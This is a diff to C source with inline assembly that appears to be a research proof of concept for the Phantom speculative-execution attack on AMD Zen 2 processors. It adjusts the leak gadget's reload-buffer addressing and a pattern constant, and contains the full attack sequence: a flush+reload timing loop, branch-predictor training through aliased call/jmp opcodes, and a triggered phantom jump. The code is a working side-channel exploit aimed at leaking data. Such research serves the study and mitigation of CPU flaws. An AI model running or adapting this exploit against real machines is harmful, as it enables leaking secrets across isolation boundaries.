@@ -20,7 +20,7 @@
 // but 32 entries for checks
 #define RB_SLOTS 0x20
 
-#define PTRN 0x300100000000UL // Zen 2
+#define PTRN 0x100100000000UL // Zen 2
 
 // Random address of Phantom Call
 #define PHANTOM_CALL        0x40000000UL
@@ -129,17 +129,17 @@ static inline __attribute__((always_inline)) void reload_range(long base, long s
     for (volatile int k = 0; k < n; k += 2) {
         uint64_t c = n - 1 - ((k * 13 + 9) & (n - 1));
 
-	// Pick a slot from the reload buffer 
+    // Pick a slot from the reload buffer 
         unsigned volatile char *p = (uint8_t *) base + (stride * c);
-	
+    
         uint64_t t0 = rdtsc();
         *(volatile unsigned char *) p;
         uint64_t dt = rdtscp() - t0;
         
-	if (dt < THRESHOLD)
+    if (dt < THRESHOLD)
             results[c]++;
         
-	if (k == n - 2 && !done) {
+    if (k == n - 2 && !done) {
             k = -1;
             done = 1;
         }
@@ -174,7 +174,9 @@ asm(".align 0x1000\n\t"
     "nop\n\t"
     "nop\n\t"
     "nop\n\t"
-    "mov " xstr((RB_PTR + (RSB_SIZE * RB_STRIDE))) ", %r8\n\t"
+    "mov $" xstr(RSB_SIZE) ", %r8\n\t"
+    "shl $" xstr(RB_STRIDE_BITS) ", %r8\n\t"
+    "mov " xstr(RB_PTR) "(%r8), %r8\n\t" 
     "nop\n\t"
     "lfence\n\t"
     "mfence\n\t" 
@@ -244,6 +246,8 @@ int main(int argc, char *argv[]) {
     // Copy the leak gadget to PHANTOM_CALL
     memcpy((void *) PHANTOM_CALL, leak, leak_end - leak);
 
+
+    // Insert our call and jump calls in aliased addresses
     *(uint32_t *) CALL_FN_TRAIN_ALIAS = 0x00d0ff41; // call *%r8
     *(uint32_t *) jmp_fn_train_alias =  0x00e0ff41; // jmp *%r8
     
@@ -257,7 +261,7 @@ int main(int argc, char *argv[]) {
         // Inserting PhantomJMP
         // clang-format off
         asm("mov $1f, %%r10\n\t"
-	    "mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
+        "mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
             "jmp *%[phantom_train]\n\t"
             "1:\n\t" ::[phantom_train] "r"(jmp_fn_train_alias)
             : "r8", "r10");
@@ -284,11 +288,11 @@ int main(int argc, char *argv[]) {
 
         // PhantomJMP will be triggered
         asm(
-	    NOPS_str(512)
-	    "jmp phantom_jump_insert\n\t"
-	    "a:\n\t"
-	    NOPS_str(512)
-	    NOPS_str(512)
+        NOPS_str(512)
+        "jmp phantom_jump_insert\n\t"
+        "a:\n\t"
+        NOPS_str(512)
+        NOPS_str(512)
             "phantom_jump_insert:\n\t"
             NOPS_str(512)
         );
